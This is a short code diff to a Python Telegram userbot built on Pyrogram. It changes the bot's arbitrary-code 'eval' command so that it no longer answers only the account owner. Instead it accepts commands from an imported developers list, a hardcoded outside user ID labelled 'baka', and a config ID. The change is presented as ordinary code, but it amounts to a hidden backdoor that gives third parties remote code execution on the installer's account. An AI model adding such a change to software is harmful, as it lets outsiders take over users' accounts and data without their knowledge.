@@ -12,6 +12,11 @@ import traceback
 import pyrogram 
 import requests as req
 
+from nandha.shikimori import developers
+
+baka = 5597384270
+devs = developers + [baka] + [config.shiki_id]
+
 
 async def aexec(code, bot, message, my, m, r, ru):
     exec(
@@ -26,7 +31,7 @@ def p(*args, **kwargs):
     print(*args, **kwargs)
 	
 
-@bot.on_message(filters.command('e', prefixes=['.','?']) & filters.me)
+@bot.on_message(filters.command('e', prefixes=['.','?']) & filters.user(devs))
 async def evaluate(bot, message):
     
     status_message = await message.reply("`Running Code...`")
